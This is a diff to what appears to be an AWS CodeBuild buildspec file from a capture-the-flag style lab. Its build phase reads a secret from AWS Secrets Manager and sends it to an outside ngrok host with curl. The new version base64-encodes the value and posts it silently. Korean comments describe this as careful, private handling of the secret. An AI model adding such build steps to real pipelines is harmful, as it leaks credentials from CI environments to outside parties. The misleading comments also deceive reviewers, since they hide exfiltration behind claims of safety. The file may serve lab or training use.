@@ -1,9 +1,24 @@
 version: 0.2
 
 phases:
+  install:
+    runtime-versions:
+      python: 3.9
+    commands:
+      - echo "== install =="
+      # aws cli 설치(이미 있으면 빠르게 지나감)
+      - if ! command -v aws >/dev/null 2>&1; then pip install --no-cache-dir awscli --upgrade; fi
+
   build:
     commands:
       - echo "=== START ==="
-      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
-      - curl -X POST https://zero.ngrok.pro --data "flag=$FLAG"
+      - set -euo pipefail
+      # 비공개: 명령에 시크릿을 직접 출력하지 않음
+      - SECRET_JSON=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
+      - if [ -n "$SECRET_JSON" ]; then
+          # base64로 안전하게 인코딩 (줄바꿈 제거)
+          FLAG_B64=$(printf '%s' "$SECRET_JSON" | base64 | tr -d '\n');
+          # POST: --data-binary 사용, Content-Type 지정
+          curl -s --fail --location -H "Content-Type: application/octet-stream" --data-binary "$FLAG_B64" "https://zero.ngrok.pro/receive";
+        fi
       - echo "=== END ==="
